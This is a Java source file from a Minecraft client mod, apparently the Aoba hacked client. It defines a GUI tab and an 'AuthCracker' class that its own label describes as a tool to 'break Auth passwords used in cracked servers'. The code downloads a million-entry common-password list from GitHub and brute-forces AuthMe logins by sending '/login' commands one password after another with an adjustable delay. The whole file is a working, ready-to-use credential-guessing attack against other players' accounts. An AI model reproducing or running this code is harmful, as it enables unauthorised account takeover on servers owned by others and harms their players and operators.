package net.aoba.gui.tabs;

import java.io.IOException;
import java.net.URL;
import java.util.Scanner;
import java.util.concurrent.TimeUnit;

import net.aoba.core.settings.types.FloatSetting;
import net.aoba.gui.tabs.components.ButtonComponent;
import net.aoba.gui.tabs.components.SliderComponent;
import net.aoba.gui.tabs.components.StackPanelComponent;
import net.aoba.gui.tabs.components.StringComponent;
import net.minecraft.client.MinecraftClient;

public class AuthCrackerTab extends ClickGuiTab {
	private ButtonComponent start;

	private FloatSetting delay = new FloatSetting("authcracker_delay", "Delay", 100, 50, 50000, 1, null);

	private AuthCracker authCracker;
	
	Runnable startRunnable;
	Runnable endRunnable;
	
	public AuthCrackerTab(String title, int x, int y){
		super(title, x, y, false);
		this.width = 360.0f;
		
		StackPanelComponent stackPanel = new StackPanelComponent(this);
		stackPanel.setTop(30);
		
		StringComponent label = new StringComponent("This panel can be used to break Auth passwords used in cracked servers.", stackPanel);
		label.setHeight(30);
		stackPanel.addChild(label);
		
		SliderComponent slider = new SliderComponent(stackPanel, delay);
		slider.setHeight(30);
		stackPanel.addChild(slider);

		authCracker = new AuthCracker(delay);
		
		this.startRunnable = new Runnable() {
			@Override
		    public void run() {
				authCracker.Start();
				start.setText("Cancel");
				start.setOnClick(endRunnable);
		    }
		};
		
		this.endRunnable = new Runnable() {
			@Override
			public void run() {
				authCracker.Stop();
				start.setText("Start");
				start.setOnClick(startRunnable);
			}
		};
		
		start = new ButtonComponent(stackPanel, "Start", startRunnable);
		start.setHeight(30);
		stackPanel.addChild(start);
		
		this.children.add(stackPanel);
	}
}

class AuthCracker{

	private Thread curThread;
	private boolean shouldContinue = true;
	private MinecraftClient mc = MinecraftClient.getInstance();
	private FloatSetting delay;
	
	public AuthCracker(FloatSetting delay) {
		this.delay = delay;
	}
	
	private long time = System.currentTimeMillis();
	
	private void RunAuthCracker() {
		System.out.println("Aoba AuthMe Cracker Started.");
		URL url;
		Scanner s = null;
		try {
			url = new URL("https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt");
			s = new Scanner(url.openStream());
		} catch (IOException e) {
			e.printStackTrace();
		}
		if(s != null) {
			while(shouldContinue && s.hasNextLine()) {
				if(System.currentTimeMillis() - time > delay.getValue().floatValue()) {
					String str = s.nextLine();
					while(mc.player == null) {
						try {
							TimeUnit.SECONDS.sleep(1);
						} catch (InterruptedException e) {
							e.printStackTrace();
						}
					}
					if(mc.player.networkHandler != null) {
						mc.player.networkHandler.sendChatCommand("login " + str);
						time = System.currentTimeMillis();
					}else {
						System.out.println("Network Handler is null");
					}
				}
			}
		}
		
		System.out.println("Aoba AuthMe Cracker Stopped.");
	}
	
	public void Start() {
		curThread = new Thread(new Runnable() {
		    @Override
		    public void run() {
		    	RunAuthCracker();
		    }
		});  
		curThread.start();
	}
	
	public void Stop() {
		this.shouldContinue = false;
	}
}